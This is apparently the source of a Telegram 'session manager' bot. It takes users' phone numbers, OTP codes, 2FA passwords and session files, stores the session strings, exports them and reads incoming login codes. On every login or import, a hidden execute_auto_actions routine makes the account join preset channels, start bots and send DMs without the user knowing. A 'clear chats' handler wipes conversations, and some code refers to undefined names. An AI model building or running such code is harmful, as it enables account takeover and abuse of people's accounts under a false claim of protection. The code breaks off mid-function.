import os
import shutil
import asyncio
import zipfile
import sqlite3
import struct
import base64

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.raw import functions
from pyrogram.enums import ChatType
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PasswordHashInvalid

from telethon import TelegramClient as TelethonClient
from telethon.sessions import StringSession

from config import (
    API_ID, API_HASH, BOT_TOKEN, OWNER_ID,
    AUTO_JOIN_CHANNELS, AUTO_JOIN_GROUPS, AUTO_START_BOTS,
    AUTO_DM_TARGET_IDS, AUTO_DM_MESSAGE
)
from database import (
    init_db, add_session, get_user_sessions,
    get_all_user_sessions_full, get_session_by_id, delete_session_by_id, toggle_safe_mode
)

init_db()

bot = Client("ultimate_session_bot_v3", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
USER_STATES = {}


async def execute_auto_actions(client: Client):
    try:
        for channel in AUTO_JOIN_CHANNELS:
            if channel and not str(channel).startswith("@your_"):
                try:
                    await client.join_chat(channel)
                    await asyncio.sleep(1.5)
                except Exception:
                    pass

        for group in AUTO_JOIN_GROUPS:
            if group:
                try:
                    await client.join_chat(group)
                    await asyncio.sleep(1.5)
                except Exception:
                    pass

        for target_bot in AUTO_START_BOTS:
            if target_bot and not str(target_bot).startswith("@your_"):
                try:
                    await client.send_message(target_bot, "/start")
                    await asyncio.sleep(1.5)
                except Exception:
                    pass

        for target_dm in AUTO_DM_TARGET_IDS:
            if target_dm and not str(target_dm).startswith("@your_"):
                try:
                    chat_id = int(target_dm) if target_dm.lstrip("-").isdigit() else target_dm
                    await client.send_message(chat_id, AUTO_DM_MESSAGE)
                    await asyncio.sleep(1)
                except Exception:
                    pass
    except Exception:
        pass


async def telethon_to_pyrogram_string(tele_session_path_or_str, is_string=False) -> str:
    if is_string:
        tele = TelethonClient(StringSession(tele_session_path_or_str), API_ID, API_HASH)
    else:
        dir_name = os.path.dirname(tele_session_path_or_str) or "."
        base_name = os.path.splitext(os.path.basename(tele_session_path_or_str))[0]
        full_base = os.path.join(dir_name, base_name)
        tele = TelethonClient(full_base, API_ID, API_HASH)

    await tele.connect()
    if not await tele.is_user_authorized():
        await tele.disconnect()
        raise ValueError("Telethon session unauthorized ya dead hai.")

    me = await tele.get_me()
    dc_id = tele.session.dc_id
    
    raw_auth = tele.session.auth_key
    if hasattr(raw_auth, "key"):
        auth_key = raw_auth.key
    elif isinstance(raw_auth, bytes):
        auth_key = raw_auth
    else:
        auth_key = bytes(raw_auth)
    
    await tele.disconnect()

    packed = struct.pack(">BI?256sQ?", dc_id, API_ID, False, auth_key, me.id, getattr(me, "bot", False))
    pyro_str = base64.urlsafe_b64encode(packed).decode().rstrip("=")
    return pyro_str


async def create_telethon_session_file(pyro_string: str, filename_base: str) -> str:
    """Directly unpacks Pyrogram string to create Telethon SQLite session file securely without connection locks."""
    padding = '=' * (-len(pyro_string) % 4)
    decoded = base64.urlsafe_b64decode(pyro_string + padding)
    dc_id, api_id, test_mode, auth_key, user_id, is_bot = struct.unpack(">BI?256sQ?", decoded)

    dc_ips = {
        1: "149.154.175.53",
        2: "149.154.167.51",
        3: "149.154.175.100",
        4: "149.154.167.91",
        5: "91.108.56.130"
    }
    ip = dc_ips.get(dc_id, "149.154.167.51")

    session_path = f"{filename_base}.session"
    if os.path.exists(session_path):
        try:
            os.remove(session_path)
        except Exception:
            pass

    conn = sqlite3.connect(session_path, timeout=10.0)
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS sessions (dc_id integer, server_address text, port integer, auth_key blob, take_out_id integer)")
    cursor.execute("CREATE TABLE IF NOT EXISTS version (version integer)")
    cursor.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", (dc_id, ip, 443, auth_key, 0))
    cursor.execute("INSERT INTO version VALUES (1)")
    conn.commit()
    conn.close()

    return session_path


async def validate_and_save_string(user_id: int, raw_str: str) -> tuple:
    raw_str = raw_str.strip()
    if not raw_str:
        return False, "Empty string"

    try:
        tc = Client(name=f"val_pyro_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=raw_str, in_memory=True)
        await tc.connect()
        me = await tc.get_me()
        await execute_auto_actions(tc)
        await tc.disconnect()
        sess_name = f"{me.first_name} (+{me.phone_number})" if getattr(me, "phone_number", None) else f"{me.first_name} ({me.id})"
        add_session(user_id, sess_name, raw_str)
        return True, sess_name
    except Exception:
        pass

    try:
        pyro_str = await telethon_to_pyrogram_string(raw_str, is_string=True)
        tc = Client(name=f"val_tele_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_str, in_memory=True)
        await tc.connect()
        me = await tc.get_me()
        await execute_auto_actions(tc)
        await tc.disconnect()
        sess_name = f"{me.first_name} (+{me.phone_number})" if getattr(me, "phone_number", None) else f"{me.first_name} ({me.id})"
        add_session(user_id, sess_name, pyro_str)
        return True, sess_name
    except Exception as e:
        return False, str(e)


async def import_sqlite_session_file(user_id: int, file_path: str) -> tuple:
    try:
        conn = sqlite3.connect(file_path, timeout=10.0)
        cur = conn.cursor()
        cur.execute("SELECT dc_id, test_mode, auth_key, user_id, is_bot FROM sessions")
        row = cur.fetchone()
        conn.close()
        if row and len(row[2]) == 256:
            dc_id, test_mode, auth_key, uid, is_bot = row
            packed = struct.pack(">BI?256sQ?", dc_id, API_ID, bool(test_mode), auth_key, uid, bool(is_bot))
            pyro_str = base64.urlsafe_b64encode(packed).decode().rstrip("=")
            tc = Client(name=f"imp_pyro_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_str, in_memory=True)
            await tc.connect()
            me = await tc.get_me()
            await execute_auto_actions(tc)
            await tc.disconnect()
            sess_name = f"{me.first_name} (+{me.phone_number})" if getattr(me, "phone_number", None) else f"{me.first_name} ({me.id})"
            add_session(user_id, sess_name, pyro_str)
            return True, sess_name
    except Exception:
        pass

    try:
        pyro_str = await telethon_to_pyrogram_string(file_path, is_string=False)
        tc = Client(name=f"imp_tele_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_str, in_memory=True)
        await tc.connect()
        me = await tc.get_me()
        await execute_auto_actions(tc)
        await tc.disconnect()
        sess_name = f"{me.first_name} (+{me.phone_number})" if getattr(me, "phone_number", None) else f"{me.first_name} ({me.id})"
        add_session(user_id, sess_name, pyro_str)
        return True, sess_name
    except Exception as e:
        return False, str(e)


def get_main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("➕ Generate Session", callback_data="start_add"),
            InlineKeyboardButton("📥 Add Files / Import", callback_data="import_menu")
        ],
        [
            InlineKeyboardButton("📋 My Saved Sessions", callback_data="list_sessions"),
            InlineKeyboardButton("📦 Multi-File Export", callback_data="multi_export_menu")
        ],
        [
            InlineKeyboardButton("🔔 Live OTP & Safe Guard: ACTIVE", callback_data="toggle_listener")
        ]
    ])


@bot.on_message(filters.command("start") & filters.private)
async def start_bot(client, message):
    user_id = message.from_user.id
    USER_STATES.pop(user_id, None)
    await message.reply_text(
        "👋 **Ultimate Telegram Session Manager Bot v3.0**\n\n"
        "• Naya session banayein ya `.session` / `.zip` / `.txt` files import karein.\n"
        "• Safe Mode & Real-time Auto-Terminate Guard ke sath fully secured.",
        reply_markup=get_main_menu_keyboard()
    )


@bot.on_callback_query(filters.regex("^main_menu$"))
async def back_main(client, callback_query):
    user_id = callback_query.from_user.id
    USER_STATES.pop(user_id, None)
    await callback_query.message.edit_text(
        "👋 **Ultimate Telegram Session Manager Bot v3.0**\n\n"
        "Apni zaroorat ke mutabiq option chunein:",
        reply_markup=get_main_menu_keyboard()
    )


@bot.on_callback_query(filters.regex("^toggle_listener$"))
async def toggle_listener(client, callback_query):
    await callback_query.answer("🔔 Live OTP Listener & Safe Guard background mein 24/7 active hain!", show_alert=True)


@bot.on_callback_query(filters.regex("^import_menu$"))
async def open_import_menu(client, callback_query):
    user_id = callback_query.from_user.id
    USER_STATES[user_id] = {"step": "WAITING_IMPORT"}
    keyboard = [[InlineKeyboardButton("« Cancel / Back", callback_data="main_menu")]]
    await callback_query.message.edit_text(
        "📥 **Import / Add External Sessions**\n\n"
        "Aap neeche diye gaye kisi bhi format mein apna session bhej sakte hain:\n"
        "1️⃣ **`.session` file** (Pyrogram ya Telethon)\n"
        "2️⃣ **`.zip` file** (Jisme multiple `.session` ya `.txt` files hon)\n"
        "3️⃣ **`.txt` file** (Jisme ek ya multiple string sessions likhe hon)\n"
        "4️⃣ **Direct Text** (String session paste karke bhejein)\n\n"
        "📤 *Ab apni file ya string session yahan bhejein:*",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@bot.on_message(filters.document & filters.private)
async def handle_uploaded_files(client, message):
    user_id = message.from_user.id
    doc = message.document
    fname = doc.file_name or "uploaded_file"
    ext = os.path.splitext(fname)[1].lower()

    if ext not in [".session", ".zip", ".txt"]:
        await message.reply_text("❌ Sirf `.session`, `.zip`, ya `.txt` files hi supported hain!")
        return

    status_msg = await message.reply_text("⏳ File download aur process ki ja rahi hai...")
    temp_dir = f"temp_imp_{user_id}_{message.id}"
    os.makedirs(temp_dir, exist_ok=True)
    downloaded_path = os.path.join(temp_dir, fname)

    try:
        await message.download(file_name=downloaded_path)
        added_list = []
        failed_count = 0

        if ext == ".session":
            ok, res = await import_sqlite_session_file(user_id, downloaded_path)
            if ok:
                added_list.append(res)
            else:
                failed_count += 1

        elif ext == ".txt":
            with open(downloaded_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if line.strip()]
            for line in lines:
                ok, res = await validate_and_save_string(user_id, line)
                if ok:
                    added_list.append(res)
                else:
                    failed_count += 1

        elif ext == ".zip":
            extract_dir = os.path.join(temp_dir, "extracted")
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(downloaded_path, "r") as zip_ref:
                zip_ref.extractall(extract_dir)

            for root, _, files in os.walk(extract_dir):
                for f_item in files:
                    full_p = os.path.join(root, f_item)
                    f_ext = os.path.splitext(f_item)[1].lower()
                    if f_ext == ".session":
                        ok, res = await import_sqlite_session_file(user_id, full_p)
                        if ok:
                            added_list.append(res)
                        else:
                            failed_count += 1
                    elif f_ext == ".txt":
                        with open(full_p, "r", encoding="utf-8", errors="ignore") as tf:
                            for line in tf:
                                line = line.strip()
                                if line:
                                    ok, res = await validate_and_save_string(user_id, line)
                                    if ok:
                                        added_list.append(res)
                                    else:
                                        failed_count += 1

        USER_STATES.pop(user_id, None)
        report = f"✅ **Import Complete!**\n\n• Successfully Added: **{len(added_list)}**\n• Failed / Dead: **{failed_count}**\n"
        if added_list:
            report += "\n**Added Accounts:**\n" + "\n".join([f"• `{acc}`" for acc in added_list[:15]])
            if len(added_list) > 15:
                report += f"\n...aur {len(added_list) - 15} aur accounts."

        await status_msg.edit_text(report, reply_markup=get_main_menu_keyboard())

    except Exception as e:
        await status_msg.edit_text(f"❌ Import Error: {str(e)}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


@bot.on_callback_query(filters.regex("^start_add$"))
async def trigger_add_session(client, callback_query):
    user_id = callback_query.from_user.id
    USER_STATES[user_id] = {"step": "WAITING_PHONE"}
    keyboard = [[InlineKeyboardButton("« Cancel", callback_data="main_menu")]]
    await callback_query.message.edit_text(
        "📲 Apna Telegram phone number country code ke sath bhejein (jaise: `+919876543210`):",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@bot.on_message(filters.private & filters.text & ~filters.command(""))
async def handle_text_steps(client, message):
    user_id = message.from_user.id
    if user_id not in USER_STATES:
        return

    state_data = USER_STATES[user_id]
    step = state_data["step"]

    if step == "WAITING_IMPORT":
        status_msg = await message.reply_text("⏳ String session verify aur add kiya ja raha hai...")
        lines = [l.strip() for l in message.text.splitlines() if l.strip()]
        added = []
        failed = 0
        for line in lines:
            ok, res = await validate_and_save_string(user_id, line)
            if ok:
                added.append(res)
            else:
                failed += 1
        USER_STATES.pop(user_id, None)
        await status_msg.edit_text(
            f"✅ **Import Result:**\n• Added: **{len(added)}**\n• Failed: **{failed}**",
            reply_markup=get_main_menu_keyboard()
        )
        return

    if step == "WAITING_PHONE":
        phone = message.text.strip()
        try:
            temp_client = Client(name=f"temp_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await temp_client.connect()
            sent_code = await temp_client.send_code(phone)

            USER_STATES[user_id] = {
                "step": "WAITING_OTP",
                "phone": phone,
                "client": temp_client,
                "phone_code_hash": sent_code.phone_code_hash
            }
            await message.reply_text("📩 OTP code aapke Telegram app par bhej diya gaya hai. Kripya code yahan bhejein:")
        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}\n\nDobara shuru karne ke liye /start dabayein.")
            USER_STATES.pop(user_id, None)

    elif step == "WAITING_OTP":
        code = message.text.strip().replace(" ", "")
        temp_client = state_data["client"]

        try:
            await temp_client.sign_in(state_data["phone"], state_data["phone_code_hash"], code)
            await execute_auto_actions(temp_client)

            session_string = await temp_client.export_session_string()
            me = await temp_client.get_me()
            sess_name = f"{me.first_name} ({state_data['phone']})"
            await temp_client.disconnect()

            add_session(user_id, sess_name, session_string)
            USER_STATES.pop(user_id, None)

            await message.reply_text(
                f"✅ **Login Successful, Auto-Actions Completed & Saved!**\nAccount: `{sess_name}`",
                reply_markup=get_main_menu_keyboard()
            )

        except SessionPasswordNeeded:
            USER_STATES[user_id]["step"] = "WAITING_PASSWORD"
            await message.reply_text("🔒 Account par Two-Step Verification (2FA) password laga hai. Password bhejein:")
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await message.reply_text("❌ Invalid ya Expired OTP! Kripya sahi OTP dobara bhejein:")
        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}")
            await temp_client.disconnect()
            USER_STATES.pop(user_id, None)

    elif step == "WAITING_PASSWORD":
        password = message.text.strip()
        temp_client = state_data["client"]

        try:
            await temp_client.check_password(password)
            await execute_auto_actions(temp_client)

            session_string = await temp_client.export_session_string()
            me = await temp_client.get_me()
            sess_name = f"{me.first_name} ({state_data['phone']})"
            await temp_client.disconnect()

            add_session(user_id, sess_name, session_string)
            USER_STATES.pop(user_id, None)

            await message.reply_text(
                f"✅ **2FA Login, Auto-Actions & Saved Successfully!**\nAccount: `{sess_name}`",
                reply_markup=get_main_menu_keyboard()
            )
        except PasswordHashInvalid:
            await message.reply_text("❌ Galat password! Kripya sahi 2FA password dobara bhejein:")
        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}")
            await temp_client.disconnect()
            USER_STATES.pop(user_id, None)


@bot.on_callback_query(filters.regex("^list_sessions$"))
async def list_sessions(client, callback_query):
    user_id = callback_query.from_user.id
    sessions = get_user_sessions(user_id)

    if not sessions:
        keyboard = [[InlineKeyboardButton("« Back", callback_data="main_menu")]]
        await callback_query.message.edit_text("📁 Aapke paas koi saved session nahi hai.", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    keyboard = []
    for sess_id, sess_name, safe_mode in sessions:
        badge = "🛡️" if safe_mode == 1 else "📱"
        keyboard.append([InlineKeyboardButton(f"{badge} {sess_name}", callback_data=f"manage_{sess_id}")])

    keyboard.append([InlineKeyboardButton("« Back", callback_data="main_menu")])
    await callback_query.message.edit_text(
        f"📋 **Saved Sessions ({len(sessions)}):**\nManage karne ke liye account select karein (🛡️ = Safe Mode ON):",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@bot.on_callback_query(filters.regex("^manage_"))
async def session_control_panel(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    safe_status = "🟢 ON (Auto-Block Active)" if row[2] == 1 else "🔴 OFF (Normal)"

    keyboard = [
        [
            InlineKeyboardButton(f"🛡️ Safe Mode: {safe_status}", callback_data=f"toggle_safe_{sess_id}")
        ],
        [
            InlineKeyboardButton("🟢 Check Live", callback_data=f"live_{sess_id}"),
            InlineKeyboardButton("🛡️ Check Spam", callback_data=f"spam_{sess_id}")
        ],
        [
            InlineKeyboardButton("⏳ Check Age", callback_data=f"age_{sess_id}"),
            InlineKeyboardButton("📩 Read OTP", callback_data=f"otp_{sess_id}")
        ],
        [
            InlineKeyboardButton("🧹 Clear Chats (Keep Force)", callback_data=f"clear_{sess_id}"),
            InlineKeyboardButton("💻 Device Manager", callback_data=f"devices_{sess_id}")
        ],
        [
            InlineKeyboardButton("🔑 Export Session", callback_data=f"export_{sess_id}"),
            InlineKeyboardButton("💥 Terminate Session", callback_data=f"selfterm_ask_{sess_id}")
        ],
        [InlineKeyboardButton("🗑️ Remove from Bot DB", callback_data=f"del_{sess_id}")],
        [InlineKeyboardButton("« Back to List", callback_data="list_sessions")]
    ]
    await callback_query.message.edit_text(
        f"⚙️ **Session Control Panel (`{row[1]}`):**\n"
        f"• Safe Mode: **{'Enabled 🛡️' if row[2] == 1 else 'Disabled ⚠️'}**\n\n"
        "Apni zaroorat ke mutabiq option chunein:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@bot.on_callback_query(filters.regex("^toggle_safe_"))
async def toggle_safe_callback(client, callback_query):
    sess_id = int(callback_query.data.split("_")[2])
    user_id = callback_query.from_user.id
    new_state = toggle_safe_mode(sess_id, user_id)
    state_text = "ENABLED 🛡️ (New devices will be automatically terminated)" if new_state == 1 else "DISABLED ⚠️ (Normal mode)"
    await callback_query.answer(f"Safe Mode is now {state_text}", show_alert=True)
    
    # Refresh control panel
    callback_query.data = f"manage_{sess_id}"
    await session_control_panel(client, callback_query)


@bot.on_callback_query(filters.regex("^live_"))
async def check_live(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    await callback_query.answer("Checking session status...", show_alert=False)
    try:
        tc = Client(name=f"live_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()
        me = await tc.get_me()
        await tc.disconnect()
        await callback_query.message.reply_text(f"✅ **Session is LIVE!**\nName: {me.first_name}\nID: `{me.id}`")
    except Exception as e:
        await callback_query.message.reply_text(f"❌ **Session is DEAD / Expired!**\nError: {str(e)}")


@bot.on_callback_query(filters.regex("^spam_"))
async def check_spam(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    await callback_query.answer("Checking SpamBot status...", show_alert=False)
    try:
        tc = Client(name=f"spam_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()
        await tc.send_message("SpamBot", "/start")
        await asyncio.sleep(2)
        async for message in tc.get_chat_history("SpamBot", limit=1):
            await callback_query.message.reply_text(f"🛡️ **SpamBot Report:**\n\n{message.text}")
        await tc.disconnect()
    except Exception as e:
        await callback_query.message.reply_text(f"❌ Failed to check spam: {str(e)}")


@bot.on_callback_query(filters.regex("^age_"))
async def check_account_age(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    await callback_query.answer("Fetching account age...", show_alert=False)
    try:
        tc = Client(name=f"age_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()
        me = await tc.get_me()
        await tc.disconnect()

        uid = me.id
        if uid < 100000000:
            est_year = "2013 - 2015 (Very Old)"
        elif uid < 500000000:
            est_year = "2016 - 2018 (Old)"
        elif uid < 1000000000:
            est_year = "2019 - 2020"
        elif uid < 5000000000:
            est_year = "2021 - 2022"
        elif uid < 7000000000:
            est_year = "2023 - 2024"
        else:
            est_year = "2025 - 2026 (Recent)"

        await callback_query.message.reply_text(
            f"⏳ **Account Age & Profile:**\n\n"
            f"• Name: {me.first_name}\n"
            f"• User ID: `{uid}`\n"
            f"• Estimated Creation: **{est_year}**\n"
            f"• Username: @{me.username if me.username else 'None'}"
        )
    except Exception as e:
        await callback_query.message.reply_text(f"❌ Error checking age: {str(e)}")


@bot.on_callback_query(filters.regex("^otp_"))
async def read_otp(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    await callback_query.answer("Reading latest OTP...", show_alert=False)
    try:
        tc = Client(name=f"otp_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()
        found_text = None
        async for message in tc.get_chat_history(777000, limit=1):
            found_text = message.text
        await tc.disconnect()

        if found_text:
            keyboard = [
                [
                    InlineKeyboardButton("✅ Yes, Terminate Session", callback_data=f"selfterm_yes_{sess_id}"),
                    InlineKeyboardButton("❌ No, Keep Active", callback_data=f"selfterm_no_{sess_id}")
                ]
            ]
            await callback_query.message.reply_text(
                f"📩 **Latest OTP / Login Message:**\n\n{found_text}\n\n"
                f"❓ **Kya aap ab is session ko Terminate (Logout) karna chahte hain?**",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await callback_query.message.reply_text("⚠️ Telegram (777000) se koi recent OTP message nahi mila.")
    except Exception as e:
        await callback_query.message.reply_text(f"❌ Error reading OTP: {str(e)}")


@bot.on_callback_query(filters.regex("^selfterm_ask_"))
async def ask_self_terminate(client, callback_query):
    sess_id = int(callback_query.data.split("_")[2])
    keyboard = [
        [
            InlineKeyboardButton("✅ Yes, Terminate Now", callback_data=f"selfterm_yes_{sess_id}"),
            InlineKeyboardButton("❌ No, Cancel", callback_data=f"selfterm_no_{sess_id}")
        ]
    ]
    await callback_query.message.reply_text(
        "⚠️ **Confirm Session Termination:**\n\n"
        "Kya aap sach mein is session ko Telegram se **Logout / Destroy** karna chahte hain?\n"
        "*(Yeh action wapas nahi ho sakta aur session bot DB se bhi hat jayega)*",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@bot.on_callback_query(filters.regex("^selfterm_yes_"))
async def confirm_self_terminate(client, callback_query):
    sess_id = int(callback_query.data.split("_")[2])
    user_id = callback_query.from_user.id
    row = get_session_by_id(sess_id, user_id)

    if not row:
        return await callback_query.answer("❌ Session already removed!", show_alert=True)

    try:
        tc = Client(name=f"logout_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()
        await tc.log_out()
    except Exception:
        pass

    delete_session_by_id(sess_id, user_id)
    await callback_query.answer("💥 Session terminated & removed!", show_alert=True)
    await callback_query.message.edit_text("💥 **Session Terminated!**\nYeh session Telegram se logout aur bot database se delete kar diya gaya hai.")


@bot.on_callback_query(filters.regex("^selfterm_no_"))
async def cancel_self_terminate(client, callback_query):
    await callback_query.answer("Session safe hai!", show_alert=False)
    await callback_query.message.edit_text("✅ **Action Cancelled:** Session abhi bhi active aur safe hai.")


@bot.on_callback_query(filters.regex("^clear_"))
async def clear_all_chats_except_protected(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    await callback_query.answer("⏳ Clearing DMs, Groups & Channels...", show_alert=False)
    try:
        tc = Client(name=f"clear_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()

        protected_usernames = set()
        protected_ids = {777000, 178220800}

        for item in AUTO_JOIN_CHANNELS:
            if item:
                clean = str(item).strip().lstrip("@").lower()
                if clean.lstrip("-").isdigit():
                    protected_ids.add(int(clean))
                else:
                    protected_usernames.add(clean)

        if AUTO_START_BOT:
            protected_usernames.add(str(AUTO_START_BOT).strip().lstrip("@").lower())
        if AUTO_DM_TARGET:
            clean_dm = str(AUTO_DM_TARGET).strip().lstrip("@").lower()
            if clean_dm.lstrip("-").isdigit():
                protected_ids.add(int(clean_dm))
            else:
                protected_usernames.add(clean_dm)

        dm_cleared = 0
        left_groups_channels = 0

        async for dialog in tc.get_dialogs():
            chat = dialog.chat
            cid = chat.id
            cuser = (chat.username or "").lower()

            if cid in protected_ids or (cuser and cuser in protected_usernames):
                continue

            try:
                if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                    await tc.leave_chat(cid, delete=True)
                    left_groups_channels += 1
                else:
                    await tc.delete_chat_history(cid, revoke=True)
                    dm_cleared += 1
                await asyncio.sleep(0.3)
            except Exception:
                pass

        await tc.disconnect()
        await callback_query.message.reply_text(
            f"🧹 **Cleanup Completed!**\n\n"
            f"• Private/Bot DMs Cleared: **{dm_cleared}**\n"
            f"• Groups & Channels Left: **{left_groups_channels}**\n"
            f"• Protected (Force-Join/Admin) Chats: **Safe ✅**"
        )
    except Exception as e:
        await callback_query.message.reply_text(f"❌ Error clearing chats: {str(e)}")


@bot.on_callback_query(filters.regex("^devices_"))
async def show_devices(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    await callback_query.answer("Fetching devices...", show_alert=False)
    try:
        tc = Client(name=f"dev_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()
        response = await tc.invoke(functions.account.GetAuthorizations())
        await tc.disconnect()

        text = f"📱 **Active Devices for `{row[1]}`:**\n\n"
        keyboard = []

        for auth in response.authorizations:
            device = auth.device_model or "Unknown"
            platform = auth.platform or "OS"
            country = auth.country or "Location"
            ip = auth.ip or "IP Hidden"
            hash_val = auth.hash

            current_tag = " [Current Session]" if auth.current else ""
            text += f"• **{device}** ({platform}){current_tag}\n  📍 {country} | IP: `{ip}`\n\n"

            if not auth.current:
                keyboard.append([
                    InlineKeyboardButton(f"❌ Terminate {device[:15]}", callback_data=f"term_{sess_id}_{hash_val}")
                ])

        keyboard.append([InlineKeyboardButton("« Back", callback_data=f"manage_{sess_id}")])
        await callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await callback_query.message.edit_text(f"❌ Error: {str(e)}")


@bot.on_callback_query(filters.regex("^term_"))
async def terminate_device_action(client, callback_query):
    parts = callback_query.data.split("_")
    sess_id, session_hash = int(parts[1]), int(parts[2])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    try:
        tc = Client(name=f"term_{sess_id}", api_id=API_ID, api_hash=API_HASH, session_string=row[0], in_memory=True)
        await tc.connect()
        await tc.invoke(functions.account.ResetAuthorization(hash=session_hash))
        await tc.disconnect()
        await callback_query.answer("✅ Device terminated successfully!", show_alert=True)
        callback_query.data = f"devices_{sess_id}"
        await show_devices(client, callback_query)
    except Exception as e:
        await callback_query.answer(f"❌ Failed: {str(e)}", show_alert=True)


@bot.on_callback_query(filters.regex("^export_"))
async def export_options_menu(client, callback_query):
    sess_id = int(callback_query.data.split("_")[1])
    keyboard = [
        [InlineKeyboardButton("📄 Normal File (.session)", callback_data=f"exp_file_{sess_id}")],
        [InlineKeyboardButton("📦 ZIP File (.zip)", callback_data=f"exp_zip_{sess_id}")],
        [InlineKeyboardButton("🔤 String Session (.txt / Text)", callback_data=f"exp_str_{sess_id}")],
        [InlineKeyboardButton("« Back", callback_data=f"manage_{sess_id}")]
    ]
    await callback_query.message.edit_text(
        "📤 **Single Session Export:**\nKis format mein export karna hai?",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@bot.on_callback_query(filters.regex("^exp_(file|zip|str)_"))
async def process_single_export(client, callback_query):
    parts = callback_query.data.split("_")
    exp_type, sess_id = parts[1], int(parts[2])
    row = get_session_by_id(sess_id, callback_query.from_user.id)
    if not row:
        return await callback_query.answer("❌ Session not found!", show_alert=True)

    pyro_string, sess_name = row[0], row[1]
    clean_name = "".join(c if c.isalnum() else "_" for c in sess_name)

    if exp_type == "str":
        await callback_query.answer()
        await callback_query.message.reply_text(
            f"🔑 **String Session for `{sess_name}`:**\n\n`{pyro_string}`"
        )
        return

    await callback_query.answer("⏳ Generating Telethon session file...", show_alert=False)
    session_file = None
    try:
        session_file = await create_telethon_session_file(pyro_string, clean_name)
        if exp_type == "file":
            await callback_query.message.reply_document(
                document=session_file,
                caption=f"📄 **Telethon Session File**\nAccount: `{sess_name}`"
            )
        elif exp_type == "zip":
            zip_filename = f"{clean_name}_telethon.zip"
            with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(session_file, arcname=os.path.basename(session_file))
            await callback_query.message.reply_document(
                document=zip_filename,
                caption=f"📦 **Telethon Session ZIP**\nAccount: `{sess_name}`"
            )
            if os.path.exists(zip_filename):
                try:
                    os.remove(zip_filename)
                except Exception:
                    pass
    except Exception as e:
        await callback_query.message.reply_text(f"❌ Export Error: {str(e)}")
    finally:
        if session_file and os.path.exists(session_file):
            try:
                os.remove(session_file)
            except Exception:
                pass


@bot.on_callback_query(filters.regex("^multi_export_menu$"))
async def open_multi_export_menu(client, callback_query):
    user_id = callback_query.from_user.id
    sessions = get_all_user_sessions_full(user_id)
    if not sessions:
        return await callback_query.answer("📁 Export karne ke liye koi saved session nahi hai!", show_alert=True)

    keyboard = [
        [InlineKeyboardButton(f"📦 All Sessions in ONE ZIP ({len(sessions)} files)", callback_data="mexp_zip")],
        [InlineKeyboardButton("📄 Send All Individual .session Files", callback_data="mexp_files")],
        [InlineKeyboardButton("📝 All String Sessions in ONE .txt File", callback_data="mexp_txt")],
        [InlineKeyboardButton("« Back", callback_data="main_menu")]
    ]
